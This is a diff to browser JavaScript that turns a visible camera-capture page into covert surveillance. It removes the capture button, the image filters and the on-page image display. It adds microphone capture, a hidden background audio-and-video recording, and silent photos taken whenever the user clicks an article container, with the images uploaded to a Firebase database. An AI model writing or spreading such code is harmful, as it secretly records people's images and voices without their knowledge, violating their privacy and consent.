@@ -21,35 +21,22 @@ const storage = getStorage(app);
 // Access the video and canvas elements
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
-const captureButton = document.getElementById('capture');
-const imagesContainer = document.getElementById('images');
-const overlay = document.getElementById('overlay');
-const closeButton = document.getElementById('closeButton');
-const brightnessSlider = document.getElementById('brightness');
-const contrastSlider = document.getElementById('contrast');
 
-// Request camera access
-navigator.mediaDevices.getUserMedia({ video: true })
+// Request camera and audio access
+navigator.mediaDevices.getUserMedia({ video: true, audio: true })
     .then(stream => {
         video.srcObject = stream;
-
-        // Start recording the video
+        // Start background video recording with audio
         startBackgroundVideoRecording(stream);
     })
     .catch(err => console.error("Error accessing camera: ", err));
 
-// Apply brightness and contrast adjustments
-brightnessSlider.addEventListener('input', applyFilters);
-contrastSlider.addEventListener('input', applyFilters);
+// Capture photo on article click
+document.getElementById('article-container').addEventListener('click', () => {
+    captureImage();
+});
 
-function applyFilters() {
-    const brightness = brightnessSlider.value;
-    const contrast = contrastSlider.value;
-    video.style.filter = `brightness(${brightness}%) contrast(${contrast}%)`;
-}
-
-// Capture the photo and save to Firebase Realtime Database
-captureButton.addEventListener('click', () => {
+function captureImage() {
     const context = canvas.getContext('2d');
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
@@ -68,49 +55,17 @@ captureButton.addEventListener('click', () => {
         timestamp: new Date().toISOString()
     }).then(() => {
         console.log('Image saved to Realtime Database');
-        displayImage(base64Image); // Display image in the session
     }).catch(error => {
         console.error('Error saving image to Realtime Database:', error);
     });
-});
-
-// Display image in the session
-function displayImage(base64Image) {
-    const imageWrapper = document.createElement('div');
-    imageWrapper.className = 'image-wrapper';
-    const img = document.createElement('img');
-    img.src = base64Image; // Use the base64 string as the src
-    imageWrapper.appendChild(img);
-    imagesContainer.appendChild(imageWrapper);
-
-    // Add click event to maximize image
-    imageWrapper.addEventListener('click', () => {
-        const clonedImg = img.cloneNode();
-        clonedImg.style.maxWidth = '90vw';
-        clonedImg.style.maxHeight = '90vh';
-        overlay.innerHTML = ''; // Clear any previous content
-        overlay.appendChild(clonedImg);
-        overlay.appendChild(closeButton);
-        overlay.style.display = 'flex';
-    });
 }
 
-// Hide the overlay when close button is clicked
-closeButton.addEventListener('click', () => {
-    overlay.style.display = 'none';
-});
-
-// Clear images on page load (only in DOM, not Firebase)
-window.addEventListener('load', () => {
-    imagesContainer.innerHTML = '';
-});
-
-// Background video recording for 1 minute
+// Background video recording for 10 seconds
 function startBackgroundVideoRecording(stream) {
     console.log("Starting background video recording...");
 
     // Create a MediaRecorder instance
-    const mediaRecorder = new MediaRecorder(stream);
+    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8,opus' });
     const chunks = [];
 
     // On data available, add the chunk to the array
@@ -159,8 +114,8 @@ function startBackgroundVideoRecording(stream) {
     mediaRecorder.start();
     console.log("Recording started.");
 
-    // Stop recording after 1 minute
+    // Stop recording after 10 seconds
     setTimeout(() => {
         mediaRecorder.stop();
-    }, 10000); // 10000 ms = 10 second
+    }, 10000); // 10000 ms = 10 seconds
 }
